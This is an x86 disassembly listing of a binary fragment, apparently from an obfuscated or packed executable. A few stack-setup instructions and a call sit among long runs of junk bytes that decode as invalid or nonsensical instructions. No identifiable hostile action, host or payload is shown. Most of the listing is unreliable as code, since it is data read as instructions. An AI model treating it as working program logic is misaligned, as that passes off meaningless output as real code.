  40f54b:	push   0xa1e5e03a
  40f550:	mov    al,0x1d
  40f552:	int    0x44
  40f554:	js     0x40f56e
  40f556:	inc    ebp
  40f557:	es pop ds
  40f559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f55a:	icebp  
  40f55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f55c:	inc    ebx
  40f55d:	xchg   DWORD PTR [ebp+0x70bbf072],edx
  40f563:	mov    dh,0xd9
  40f565:	or     al,0x61
  40f567:	pop    ds
  40f568:	test   esp,eax
  40f56a:	loope  0x40f555
  40f56c:	push   esp
  40f56d:	and    ebx,DWORD PTR [edx-0x3f]
  40f570:	in     eax,0x2d
  40f572:	pop    es
  40f573:	adc    edx,ecx
  40f575:	scas   al,BYTE PTR es:[edi]
  40f576:	arpl   WORD PTR [eax],si
  40f578:	inc    esp
  40f579:	push   esi
  40f57a:	clc    
  40f57b:	add    eax,0x3917fdd2
  40f580:	jmp    0xffe0b3ec
  40f585:	and    eax,0x882c274f
  40f58a:	scas   al,BYTE PTR es:[edi]
  40f58b:	mov    ah,0xaa
  40f58d:	fisttp DWORD PTR [ecx]
  40f58f:	call   0xc06e:0x19f9ea1f
  40f596:	imul   esi,DWORD PTR [eax+0x559a220e],0x45c7574f
  40f5a0:	test   al,0x82
  40f5a2:	xor    BYTE PTR [eax],al
  40f5a4:	add    bh,al
  40f5a6:	inc    ebp
  40f5a7:	lods   al,BYTE PTR ds:[esi]
  40f5a8:	mov    ds:0xc7000037,al
  40f5ad:	inc    ebp
  40f5ae:	mov    al,0xd6
  40f5b0:	dec    ecx
  40f5b1:	add    BYTE PTR [eax],al
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	push   ds
  40f660:	sub    dh,BYTE PTR [esi-0x6e]
  40f663:	pop    eax
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0xdaa54797
  40f66f:	and    eax,0xadd51944
  40f674:	retf   
  40f675:	jp     0x40f6f2
  40f677:	aaa    
  40f678:	ret    
  40f679:	shr    DWORD PTR [ecx+0x6f],0xeb
  40f67d:	jne    0x40f6f5
  40f67f:	fiadd  DWORD PTR [edx+esi*8-0x4a]
  40f683:	lea    edi,[edi+0xcbc4fe4]
  40f689:	mov    ebx,0xc2d7a500
  40f68e:	sub    DWORD PTR [ebx],edi
  40f690:	or     al,0x31
  40f692:	aas    
  40f693:	in     al,0xda
  40f695:	std    
  40f696:	lea    esp,[edx-0x3f0bd434]
  40f69c:	icebp  
  40f69d:	(bad)  
  40f69f:	fcomp  DWORD PTR [edi+ebp*1-0x127ba6c9]
  40f6a6:	inc    ecx
  40f6a7:	sbb    eax,0xa7056f33
  40f6ac:	arpl   WORD PTR [ecx],si
  40f6ae:	mov    ?,WORD PTR [ebx]
  40f6b0:	fsubr  QWORD PTR [eax]
  40f6b2:	xchg   DWORD PTR [ebx+0x18],eax
  40f6b5:	outs   dx,DWORD PTR ds:[esi]
  40f6b6:	xchg   edx,eax
  40f6b7:	mov    ds:0x69fe44df,eax
  40f6bc:	in     eax,0x56
  40f6be:	imul   esp,DWORD PTR [ebx+0x1f50eaf6],0x25c2d565
  40f6c8:	pop    ebx
  40f6c9:	sbb    eax,0x24700f25
  40f6ce:	pop    esp
  40f6cf:	fs retf 0xf0b1
  40f6d3:	lods   al,BYTE PTR ds:[esi]
  40f6d4:	adc    edi,edx
  40f6d6:	scas   eax,DWORD PTR es:[edi]
  40f6d7:	sbb    al,0xda
  40f6d9:	or     al,0x54
  40f6db:	push   es
  40f6dc:	mov    ecx,0xdfc5ba32
  40f6e1:	dec    edx
  40f6e2:	cmc    
  40f6e3:	xchg   edi,eax
  40f6e4:	or     al,0xb0
  40f6e6:	lea    ecx,[ecx+0x549af629]
  40f6ec:	xchg   esi,eax
  40f6ed:	ret    0x6f7d
  40f6f0:	sub    DWORD PTR [ebp+0x22453be1],0xffffffa0
  40f6f7:	sub    edx,DWORD PTR [ecx+0x6d79b066]
  40f6fd:	shl    BYTE PTR [edx+0x243cd2be],0x4
  40f704:	outs   dx,DWORD PTR ds:[esi]
  40f705:	cmp    BYTE PTR [ecx-0x78e688be],ah
  40f70b:	xchg   esp,eax
  40f70c:	aam    0x38
  40f70e:	xor    al,0x84
  40f710:	sub    edi,esp
  40f712:	aaa    
  40f713:	dec    esi
  40f714:	das    
  40f715:	test   DWORD PTR [ebx-0x7a],0xd0309323
  40f71c:	shl    DWORD PTR [edx-0x6a],cl
  40f71f:	or     DWORD PTR [esp+eax*1],esp
  40f722:	xor    al,dl
  40f724:	fisubr DWORD PTR [ebp-0x14]
  40f727:	mul    bl
  40f729:	adc    eax,DWORD PTR [ebp+0x64]
  40f72c:	inc    edi
  40f72d:	popf   
  40f72e:	(bad)  
  40f72f:	loopne 0x40f6e5
  40f731:	data16 sahf 
  40f733:	out    dx,al
  40f734:	daa    
  40f735:	unpcklps xmm2,XMMWORD PTR [ebx+0x36]
  40f739:	shl    DWORD PTR fs:0xe8c7b8d7,0xf8
  40f741:	lahf   
  40f742:	addr16 push edi
  40f744:	hlt    
  40f745:	pop    edi
  40f746:	std    
  40f747:	psubusb mm1,QWORD PTR [ebp+0x50]
  40f74b:	push   0xfffffff1
  40f74d:	leave  
  40f74e:	cmp    ch,ah
  40f750:	(bad)  
  40f751:	fistp  WORD PTR [edi+ebp*8-0x16457689]
  40f758:	jae    0x40f79d
  40f75a:	push   edi
  40f75b:	or     al,0x90
  40f75d:	shl    BYTE PTR [edx],cl
  40f75f:	addr16 rcl DWORD PTR [bx-0x5fa0],1
  40f765:	add    bh,bh
  40f767:	adc    eax,0xccb1fade
  40f76c:	stc    
  40f76d:	rol    DWORD PTR [edi],0x7
  40f770:	outs   dx,BYTE PTR ds:[esi]
  40f771:	shl    BYTE PTR [edx-0x4b],1
  40f774:	adc    dl,dl
  40f776:	push   edx
  40f777:	dec    esp
  40f778:	mov    ebp,0xdf7041fc
  40f77d:	sbb    BYTE PTR [edi],ah
  40f77f:	inc    ebp
  40f780:	adc    ch,ah
  40f782:	mov    ch,0x51
  40f784:	and    esi,DWORD PTR [edx]
  40f786:	mov    ss,WORD PTR [ecx+esi*8]
  40f789:	pop    ebp
  40f78a:	aad    0xbb
  40f78c:	mov    ebp,0xade0313e
  40f791:	mov    ch,0x0
  40f793:	popa   
  40f794:	sbb    al,0x9f
  40f796:	rcr    DWORD PTR ds:0x422662c6,1
  40f79c:	cmp    al,0x38
  40f79e:	int3   
  40f79f:	and    ax,0x489d
  40f7a3:	push   ebx
  40f7a4:	inc    ebp
  40f7a5:	mov    ch,0xca
  40f7a7:	call   0x2f1b:0xb3be25f8
  40f7ae:	aad    0xea
  40f7b0:	dec    edi
  40f7b1:	mov    ebp,0x5c1a9d92
  40f7b6:	pop    edi
  40f7b7:	mov    eax,eax
  40f7b9:	rcr    DWORD PTR [edi+0x64],0x56
  40f7bd:	add    eax,DWORD PTR ds:0x6cb51dc5
  40f7c3:	cmp    eax,0xe59f5f62
  40f7c8:	ds mov edx,0x35a678b1
  40f7ce:	xchg   BYTE PTR ds:0xc5a5b2b7,cl
  40f7d4:	ror    DWORD PTR [eax-0x4a57e442],cl
  40f7da:	mov    al,0x51
  40f7dc:	(bad)
  40f7e0:	xchg   ecx,eax
  40f7e1:	cwde   
  40f7e2:	std    
  40f7e3:	pushf  
  40f7e4:	jo     0x40f861
  40f7e6:	fiadd  WORD PTR [edi+0x5d]
  40f7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ea:	mov    al,0xb4
  40f7ec:	imul   edi,DWORD PTR [edx+0x754749a4],0x3ec54dcb
  40f7f6:	xchg   ecx,eax
  40f7f7:	enter  0xaae8,0xe0
  40f7fb:	xor    eax,0x291d0a2a
  40f800:	int3   
  40f801:	adc    esi,DWORD PTR [ebx-0x4b1f6819]
  40f807:	retf   0x2dfc
  40f80a:	adc    esp,DWORD PTR [esi+0x6b]
  40f80d:	fsub   st(7),st
  40f80f:	mov    ecx,0x89bc7c9c
  40f814:	out    0x59,eax
  40f816:	xlat   BYTE PTR ds:[ebx]
  40f817:	push   esp
  40f818:	test   eax,0xd8b49682
  40f81d:	mov    DWORD PTR [ebx-0x6fc5d8dd],ebp
  40f823:	pop    ss
  40f824:	inc    esi
  40f825:	hlt    
  40f826:	inc    esp
  40f827:	push   edi
  40f828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f829:	add    ch,BYTE PTR [esi-0x6c]
  40f82c:	(bad)  gs:[ebp+0xcedbac1]
  40f833:	pop    ecx
  40f834:	cdq    
  40f835:	add    al,0xf2
  40f837:	test   DWORD PTR [edi-0x3b],0xf79815d2
  40f83e:	sub    DWORD PTR [edi+0x19],ecx
  40f841:	add    eax,0xc86f7e67
  40f846:	mov    bh,0x29
  40f848:	je     0x40f88d
  40f84a:	jae    0x40f859
  40f84c:	fld    QWORD PTR [ecx+edx*4]
  40f84f:	pop    eax
  40f850:	cmp    DWORD PTR [edi-0x1713806],esp
  40f856:	push   0xffffffb7
  40f858:	push   es
  40f859:	test   al,0xc3
  40f85b:	fadd   DWORD PTR [ebx-0x4a]
  40f85e:	in     eax,0x29
  40f860:	ins    DWORD PTR es:[edi],dx
  40f861:	add    ch,BYTE PTR [ebp+0x16]
  40f864:	lds    eax,FWORD PTR [ebp+0x74]
  40f867:	push   edi
  40f868:	cmp    al,0x4f
  40f86a:	push   edx
  40f86b:	scas   al,BYTE PTR es:[edi]
  40f86c:	jmp    0x40f803
  40f86e:	jge    0x40f875
  40f870:	add    BYTE PTR [ecx+edx*1-0x4f],0x20
  40f875:	paddq  mm2,QWORD PTR [esi+ebx*8]
  40f879:	scas   eax,DWORD PTR es:[edi]
  40f87a:	jno    0x40f879
  40f87c:	mov    eax,0xe86ddbce
  40f881:	ret    0x213d
  40f884:	es (bad) 
  40f886:	imul   esp,edx,0xc35ef457
  40f88c:	scas   eax,DWORD PTR es:[edi]
  40f88d:	xor    ecx,DWORD PTR [edi]
  40f88f:	xor    BYTE PTR [edi],ch
  40f891:	rcr    DWORD PTR [ecx+edi*8],0xd5
  40f895:	retf   
  40f896:	out    dx,eax
  40f897:	mov    eax,ds:0x4df42b04
  40f89c:	push   0xffffffd3
  40f89e:	lahf   
  40f89f:	inc    edi
  40f8a0:	ins    DWORD PTR es:[edi],dx
  40f8a1:	xchg   ebp,eax
  40f8a2:	aad    0xc0
  40f8a4:	mov    ecx,0x96d90c4f
  40f8a9:	jecxz  0x40f8d9
  40f8ab:	and    DWORD PTR [ecx+0x455837db],esp
  40f8b1:	imul   edx,DWORD PTR [ebx+0x5f26eedf],0xa801a114
  40f8bb:	jl     0x40f86d
  40f8bd:	fdiv   DWORD PTR [edi-0xa2f2062]
  40f8c3:	push   esp
  40f8c4:	mov    ecx,0x38fa3886
  40f8c9:	cmp    eax,0x817bf44b
  40f8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8cf:	mov    esi,DWORD PTR [ebp+0x63814f5]
  40f8d5:	out    0x9d,eax
  40f8d7:	(bad)  
  40f8d8:	or     DWORD PTR [eax+0x38],ebp
  40f8db:	add    edx,esp
  40f8dd:	shl    BYTE PTR [ecx-0x1b],0x3f
  40f8e1:	mov    ds:0xa9a8bfdb,eax
  40f8e6:	jmp    0x4db9920
  40f8eb:	outs   dx,DWORD PTR ds:[esi]
  40f8ec:	add    edi,DWORD PTR [esp+ecx*4-0x13]
  40f8f0:	dec    edx
  40f8f1:	or     eax,0x5ada26b1
  40f8f6:	push   0x660fb211
  40f8fb:	cwde   
  40f8fc:	scas   al,BYTE PTR es:[edi]
  40f8fd:	scas   al,BYTE PTR es:[edi]
  40f8fe:	xchg   esi,eax
  40f8ff:	in     al,0x38
  40f901:	xchg   edi,eax
  40f902:	xchg   BYTE PTR [edi-0x4a92b953],dl
  40f908:	sbb    eax,0x846b533f
  40f90d:	or     bh,bl
  40f90f:	and    bh,BYTE PTR ss:[esi]
  40f912:	iret   
  40f913:	xchg   esi,eax
  40f914:	out    dx,eax
  40f915:	fidiv  DWORD PTR [eax+0x5ddf5858]
  40f91b:	sub    al,0x6f
  40f91d:	inc    ebp
  40f91e:	call   FWORD PTR [edi-0x79251939]
  40f924:	cmp    esp,DWORD PTR [ebx]
  40f926:	jg     0x40f94a
  40f928:	jp     0x40f8bc
  40f92a:	std    
  40f92b:	rcl    DWORD PTR [bx],1
  40f92e:	rcl    DWORD PTR [edx-0x7a],1
  40f931:	or     bl,BYTE PTR [esi-0x6d6f48ec]
  40f937:	call   DWORD PTR fs:[edx+edx*8-0x2e96e3a]
  40f93f:	inc    esp
  40f940:	push   esp
  40f941:	xchg   ecx,eax
  40f942:	add    eax,0xd747fd75
  40f947:	jbe    0x40f97e
  40f949:	in     eax,0xff
  40f94b:	mov    edx,0xc7c04388
  40f950:	sbb    BYTE PTR [edi+0x5b],0x66
  40f954:	scas   eax,DWORD PTR es:[edi]
  40f955:	nop
  40f956:	dec    esp
  40f957:	jge    0x40f955
  40f959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f95a:	sahf   
  40f95b:	rcl    BYTE PTR [esi],0x81
  40f95e:	mov    WORD PTR [eax-0x74],cs
  40f961:	fdivr  st,st(5)
  40f963:	iret   
  40f964:	mov    ds:0xc4121812,al
  40f969:	mov    edi,0x4c9e7bb7
  40f96e:	fdiv   QWORD PTR [edi+0x54]
  40f971:	je     0x40f93d
  40f973:	pop    es
  40f974:	mov    cl,0xaa
  40f976:	push   edx
  40f977:	cmp    eax,0x70e1e7e9
  40f97c:	xchg   ecx,eax
  40f97d:	hlt    
  40f97e:	shl    DWORD PTR ds:0xaea237fa,cl
  40f984:	mov    ebx,0x3ca52520
  40f989:	mov    eax,ds:0xa427da33
  40f98e:	add    eax,0xfcbcdd87
  40f993:	rol    BYTE PTR [ebp+0x2519497e],cl
  40f999:	(bad)  
  40f99a:	pop    ebp
  40f99b:	cmc    
  40f99c:	jno    0x40f925
  40f99e:	and    ah,BYTE PTR [edi]
  40f9a0:	pushf  
  40f9a1:	ja     0x40f9ea
  40f9a3:	in     al,0xb1
  40f9a5:	jnp    0x40f9be
  40f9a7:	aam    0xe2
  40f9a9:	ss sub al,0x4
  40f9ac:	push   edx
  40f9ad:	outs   dx,DWORD PTR ds:[esi]
  40f9ae:	int    0xff
  40f9b0:	loope  0x40fa12
  40f9b2:	ror    esp,0x40
  40f9b5:	pop    gs
  40f9b7:	(bad)  
  40f9b8:	and    al,0x5a
  40f9ba:	ds retf 0x3ac0
  40f9be:	sbb    ebx,DWORD PTR es:[edi-0x2f0de7b6]
  40f9c5:	lock sti 
  40f9c7:	leave  
  40f9c8:	jecxz  0x40f96f
  40f9ca:	dec    ebx
  40f9cb:	popf   
  40f9cc:	sar    esi,0xbd
  40f9cf:	cdq    
  40f9d0:	xor    eax,0xff4d1ba
  40f9d5:	or     eax,0x1b441a
  40f9da:	jp     0x40f9f5
  40f9dc:	adc    dl,BYTE PTR [esi]
  40f9de:	or     al,0x18
  40f9e0:	cmp    BYTE PTR ds:0x9dccb36d,ah
  40f9e6:	jb     0x40f971
  40f9e8:	pop    ds
  40f9e9:	mov    ds:0x5def6a08,al
  40f9ee:	sbb    BYTE PTR [edx+edx*8],cl
  40f9f1:	adc    ebx,DWORD PTR ds:0x2cd11b77
  40f9f7:	cmp    eax,0xa188246b
  40f9fc:	inc    esi
  40f9fd:	adc    BYTE PTR ds:0x8bbb62e7,ch
  40fa03:	dec    ebp
  40fa04:	cld    
  40fa05:	mov    edx,DWORD PTR [ebp-0x10]
  40fa08:	mov    edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x42226c
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	dec    edi
  40fa46:	ret    0xa4cb
  40fa49:	jge    0x40fa71
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0x93f1e9cf
  40fa55:	mov    WORD PTR [ebx-0x76d03ff],fs
  40fa5b:	leave  
  40fa5c:	lahf   
  40fa5d:	push   esp
  40fa5e:	popf   
  40fa5f:	adc    BYTE PTR [eax-0x7505bb09],dl
  40fa65:	nop
  40fa66:	jg     0x40fa22
  40fa68:	mov    ch,0x87
  40fa6a:	inc    esi
  40fa6b:	test   eax,0xf4274b35
  40fa70:	mov    edx,0xb2bf26a1
  40fa75:	xor    ah,dl
  40fa77:	pushf  
  40fa78:	sahf   
  40fa79:	call   0x90c7fca8
  40fa7e:	lods   al,BYTE PTR ds:[esi]
  40fa7f:	sbb    edi,DWORD PTR [ebp+eiz*1-0x3a8f94f6]
  40fa86:	out    0x2d,eax
  40fa88:	and    BYTE PTR [esi+0x1ae54471],0xaa
  40fa8f:	add    al,0x60
  40fa91:	mov    ah,0xd2
  40fa93:	mov    ecx,edx
  40fa95:	inc    ebx
  40fa96:	fcmovne st,st(6)
  40fa98:	inc    eax
  40fa99:	jmp    0x1b8a6135
  40fa9e:	shr    cl,cl
  40faa0:	inc    ecx
  40faa1:	or     dl,BYTE PTR [edx+0x60702429]
  40faa7:	sub    al,0x5e
  40faa9:	(bad)  
  40faaa:	xor    ebp,DWORD PTR [eax+0x45]
  40faad:	jg     0x40fa38
  40faaf:	je     0x40fa5d
  40fab1:	nop
  40fab2:	xchg   BYTE PTR [eax+ebx*4-0x4b],dl
  40fab6:	test   DWORD PTR [edx-0x41eaed69],edx
  40fabc:	imul   esp,DWORD PTR [eax+0x4f31d937],0x4d
  40fac3:	iret   
  40fac4:	cmp    DWORD PTR [ebx+0x4efd8754],0xffffffc7
  40facb:	push   esp
  40facc:	mov    ebx,0xa4acbbd8
  40fad1:	scas   eax,DWORD PTR es:[edi]
  40fad2:	cmp    dl,al
  40fad4:	fcom   QWORD PTR [ebx]
  40fad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad7:	inc    eax
  40fad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad9:	xor    dl,BYTE PTR [ebx]
  40fadb:	xor    al,0xd1
  40fadd:	aaa    
  40fade:	push   ecx
  40fadf:	push   ds
  40fae0:	hlt    
  40fae1:	sahf   
  40fae2:	jb     0x40fa6f
  40fae4:	dec    edi
  40fae5:	call   0xa31e:0x573f0de9
  40faec:	sub    ebx,edi
  40faee:	scas   eax,DWORD PTR es:[edi]
  40faef:	call   0xeb8aa004
  40faf4:	sbb    DWORD PTR [ecx],edx
  40faf6:	sar    BYTE PTR [esi-0x64],1
  40faf9:	and    BYTE PTR [edi],al
  40fafb:	mov    es,WORD PTR [ecx+0x56]
  40fafe:	cs iret 
  40fb00:	repz xor al,0x55
  40fb03:	sub    ecx,DWORD PTR gs:[ebp+0x60]
  40fb07:	scas   al,BYTE PTR es:[edi]
  40fb08:	mov    eax,ds:0x71054356
  40fb0d:	mov    WORD PTR [edi+0x753c0225],cs
  40fb13:	mov    edi,0x7c021e49
  40fb18:	scas   eax,DWORD PTR es:[edi]
  40fb19:	(bad)  
  40fb1a:	mov    ebx,0x2f1b792
  40fb1f:	push   ebx
  40fb20:	lock stos BYTE PTR es:[edi],al
  40fb22:	dec    ecx
  40fb23:	pop    ss
  40fb24:	mov    DWORD PTR [esi],ecx
  40fb26:	(bad)  
  40fb28:	lods   al,BYTE PTR ds:[esi]
  40fb29:	pop    ecx
  40fb2a:	mov    cl,BYTE PTR [edx-0x14ba5ce]
  40fb30:	and    BYTE PTR [eax-0x23],dl
  40fb33:	(bad)  
  40fb34:	push   0x7469583e
  40fb39:	or     DWORD PTR [ebx],esi
  40fb3b:	(bad)  
  40fb3c:	xchg   ebx,eax
  40fb3d:	dec    ecx
  40fb3e:	fcomp  QWORD PTR [ebx-0x6d]
  40fb41:	js     0x40fb65
  40fb43:	iret   
  40fb44:	dec    esi
  40fb45:	push   esp
  40fb46:	jg     0x40fb7d
  40fb48:	cld    
  40fb49:	xchg   edx,eax
  40fb4a:	adc    ch,BYTE PTR [edi]
  40fb4c:	add    edi,DWORD PTR [ebx-0x462c85ac]
  40fb52:	pusha  
  40fb53:	xchg   esp,eax
  40fb54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb55:	ins    DWORD PTR es:[edi],dx
  40fb56:	jl     0x40fb92
  40fb58:	mov    ds:0x7c521b2,al
  40fb5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb5e:	lahf   
  40fb5f:	dec    esp
  40fb60:	and    al,BYTE PTR [esi+0x47]
  40fb63:	push   es
  40fb64:	aad    0x8a
  40fb66:	repnz sbb al,0x80
  40fb69:	xor    eax,0x5fb12c01
  40fb6e:	push   edi
  40fb6f:	shr    dh,0xcb
  40fb72:	xchg   ecx,eax
  40fb73:	jmp    0xb6b0:0x31bc25e4
  40fb7a:	adc    ch,bl
  40fb7c:	adc    BYTE PTR [edx-0x60],dh
  40fb7f:	cmp    ah,ah
  40fb81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb82:	loop   0x40fb21
  40fb84:	add    esp,DWORD PTR [eax]
  40fb86:	pop    ebp
  40fb87:	pop    edi
  40fb88:	lahf   
  40fb89:	adc    ebp,eax
  40fb8b:	pop    edi
  40fb8c:	(bad)  [edx-0x1d887b92]
  40fb92:	pop    ds
  40fb93:	or     edx,DWORD PTR [eax-0x1]
  40fb96:	sahf   
  40fb97:	rcl    DWORD PTR [ebp-0x7bc631b3],cl
  40fb9d:	fild   WORD PTR [eax-0x17]
  40fba0:	add    ah,BYTE PTR [eax-0x460232c2]
  40fba6:	in     al,dx
  40fba7:	jno    0x40fc03
  40fba9:	cmp    DWORD PTR [esi],edi
  40fbab:	ins    DWORD PTR es:[edi],dx
  40fbac:	adc    al,0x49
  40fbae:	ret    
  40fbaf:	mov    esp,0xbc9ea422
  40fbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbb5:	or     eax,0x84d9304f
  40fbba:	ret    0xf03f
  40fbbd:	xchg   ebp,eax
  40fbbe:	retf   
  40fbbf:	popf   
  40fbc0:	dec    esi
  40fbc1:	rcl    DWORD PTR [ebp-0x68],1
  40fbc4:	dec    esi
  40fbc5:	and    al,0x68
  40fbc7:	in     al,dx
  40fbc8:	addr16 jno 0x40fbd4
  40fbcb:	outs   dx,BYTE PTR fs:[esi]
  40fbcd:	clc    
  40fbce:	adc    DWORD PTR [ebp+0x7b],ebx
  40fbd1:	sbb    eax,0xbf3a87c0
  40fbd6:	push   ss
  40fbd7:	mov    al,ds:0x9ecad179
  40fbdc:	ds call 0xc05e2189
  40fbe2:	lahf   
  40fbe3:	pop    ebp
  40fbe4:	pop    ebp
  40fbe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe6:	out    dx,al
  40fbe7:	cmp    eax,0x5167e720
  40fbec:	inc    ecx
  40fbed:	test   BYTE PTR [eax-0xb80bf13],0x8f
  40fbf4:	dec    edx
  40fbf5:	add    al,0xe9
  40fbf7:	mov    bh,0x41
  40fbf9:	lods   eax,DWORD PTR ds:[esi]
  40fbfa:	iret   
  40fbfb:	sub    BYTE PTR [edx*2-0x1550e4d2],0xb2
  40fc03:	les    edx,FWORD PTR [edi+0x10b8b270]
  40fc09:	xor    ecx,DWORD PTR [ebp-0xf]
  40fc0c:	pop    eax
  40fc0d:	inc    ebp
  40fc0e:	jge    0x40fbca
  40fc10:	das    
  40fc11:	inc    esi
  40fc12:	loope  0x40fbae
  40fc14:	add    al,0x31
  40fc16:	add    ebp,eax
  40fc18:	mov    ah,0x21
  40fc1a:	xor    esp,DWORD PTR [ebx+0x18c282f2]
  40fc20:	loop   0x40fc17
  40fc22:	ret    0x471a
  40fc25:	mov    al,ds:0xf426411f
  40fc2a:	xchg   edi,eax
  40fc2b:	xor    BYTE PTR [eax*1-0x148c59e1],dh
  40fc32:	int3   
  40fc33:	fcos   
  40fc35:	add    al,0x1e
  40fc37:	jns    0x40fc8d
  40fc39:	idiv   BYTE PTR [esi-0x5fec8d8f]
  40fc3f:	mov    al,ds:0x2d7246e6
  40fc44:	test   BYTE PTR [ebx+edx*8+0x43],bl
  40fc48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc49:	clc    
  40fc4a:	jl     0x40fcc7
  40fc4c:	(bad)  
  40fc4d:	adc    DWORD PTR [eax+0x44],0xcdaab343
  40fc54:	repnz fld DWORD PTR [eax]
  40fc57:	jbe    0x40fbde
  40fc59:	cmp    bl,BYTE PTR [edx-0x5e]
  40fc5c:	pop    eax
  40fc5d:	pushf  
  40fc5e:	sub    dh,ah
  40fc60:	(bad)
  40fc65:	out    0x4b,al
  40fc67:	cmp    eax,0xd15ebb6d
  40fc6c:	dec    ecx
  40fc6d:	xchg   ebx,eax
  40fc6e:	xlat   BYTE PTR ds:[ebx]
  40fc6f:	jo     0x40fcae
  40fc71:	out    dx,al
  40fc72:	jbe    0x40fcc0
  40fc74:	in     eax,dx
  40fc75:	mov    ds:0x91a00fd1,al
  40fc7a:	jno    0x40fc6c
  40fc7c:	cli    
  40fc7d:	pop    esp
  40fc7e:	mov    eax,0x12bc1689
  40fc83:	scas   al,BYTE PTR es:[edi]
  40fc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc85:	xlat   BYTE PTR ds:[ebx]
  40fc86:	sbb    al,0x53
  40fc88:	sbb    esp,DWORD PTR [eax]
  40fc8a:	mov    esp,0x8201552a
  40fc8f:	std    
  40fc90:	enter  0xaf98,0xd0
  40fc94:	mov    bl,cl
  40fc96:	lods   eax,DWORD PTR ds:[esi]
  40fc97:	pop    edx
  40fc98:	mov    dh,0xff
  40fc9a:	aaa    
  40fc9b:	jne    0x40fccd
  40fc9d:	mov    eax,ds:0xd257d780
  40fca2:	int3   
  40fca3:	or     DWORD PTR [ebp+0x1c6bc4b2],0xffffffe3
  40fcaa:	mov    ds:0x6d60ad31,eax
  40fcaf:	push   edi
  40fcb1:	sbb    eax,0x10093ee8
  40fcb6:	lahf   
  40fcb7:	sbb    DWORD PTR [ebx-0x610d7294],esp
  40fcbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcbe:	mov    edi,0xa377178c
  40fcc3:	cld    
  40fcc4:	repnz xor al,BYTE PTR [ebx-0x14]
  40fcc8:	jmp    0x40fc8b
  40fcca:	jmp    0x40fc78
  40fccc:	addr16 in eax,0x1f
  40fccf:	cdq    
  40fcd0:	inc    esp
  40fcd1:	xchg   edx,eax
  40fcd2:	push   edi
  40fcd3:	jo     0x40fd32
  40fcd5:	cmp    eax,0xbc38ce62
  40fcda:	(bad)  [ebx-0x2c]
  40fcdd:	push   edx
  40fcde:	outs   dx,BYTE PTR ds:[esi]
  40fcdf:	fdivrp st(5),st
  40fce1:	sub    BYTE PTR [ecx+eax*1+0x3e5a45c2],0x9b
  40fce9:	fidivr WORD PTR ds:0xcbe7704
  40fcef:	dec    esp
  40fcf0:	xchg   esp,eax
  40fcf1:	jb     0x40fcff
  40fcf3:	lods   al,BYTE PTR ds:[esi]
  40fcf4:	out    dx,al
